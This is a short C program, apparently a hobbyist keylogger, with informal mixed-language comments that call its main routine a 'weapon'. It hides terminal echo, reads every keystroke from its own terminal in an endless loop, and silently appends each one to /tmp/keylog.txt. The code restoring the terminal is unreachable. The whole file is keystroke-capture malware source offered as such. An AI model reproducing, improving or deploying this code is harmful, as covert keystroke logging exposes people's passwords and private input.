#include <stdio.h>
#include <stdlib.h> 
#include <fcntl.h> 
#include <unistd.h> //FOr POSIX
#include <termios.h> // For accepting inp I/O.

// tmp ma 
#define LOG_FILE "/tmp/keylog.txt"
//Function maka
void log_key(const char *key)
{
    FILE *file = fopen(LOG_FILE, "a");
    if (file)
    {
        fprintf(file, "%s", key);
        fclose(file);
    }
}
//  Main HATIYAR 
int main(void)
{
    struct termios prev_tl, modif_tl;
    tcgetattr(STDIN_FILENO, &prev_tl); 
    modif_tl = prev_tl;
    modif_tl.c_lflag &= ~ECHO;    // hide in terminal.               
    modif_tl.c_lflag &= ~ICANON;                 
    tcsetattr(STDIN_FILENO, TCSANOW, &modif_tl);
    char buffersz[2]; // For 1 chara & null terminator's , Use can inc acc2 ur choice
    while (1)
    {
        int n = read(STDIN_FILENO, buffersz, 1);
        if (n > 0)
        {
            buffersz[1] = '\0'; 
            log_key(buffersz);  
        }
        usleep(10000); //CPU  makafosk
    }
    tcsetattr(STDIN_FILENO, TCSANOW, &prev_tl);
    return 0;
}


